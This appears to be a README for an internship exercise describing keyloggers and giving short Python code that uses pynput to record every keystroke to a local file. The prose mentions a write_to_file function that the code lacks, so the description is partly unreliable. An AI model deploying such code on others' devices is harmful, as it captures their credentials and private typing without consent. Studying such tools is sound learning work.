# Prodigy-InfoTech-task-04
This code uses the pynput library to capture keystrokes. It defines two functions: write_to_file, which writes the pressed keys to a log file, and on_press, which is called every time a key is pressed. The on_press function then calls write_to_file to log the pressed key.

Keyloggers are programs that run as a background process on a computer or other device and collect keystrokes as a user types on their keyboard. They can be malicious or used with good intentions, depending on the goals of the person installing them. Keyloggers are notoriously known for malicious intent to collect a targeted user’s credentials and other important information, but they can also be used for parental control and child safety.

from pynput.keyboard import Listener

def on_press(key):
    try:
        # Convert the key to a string and write it to the log file
        
        
        with open("keylog.txt", "a") as f:
            
            f.write(str(key) + "\n")\
                
    except Exception as e:
        
        print(f"Error: {str(e)}")

def main():
    
    # Start the listener
    
    with Listener(on_press=on_press) as listener:
        
        listener.join()

if __name__ == "__main__":
    main()

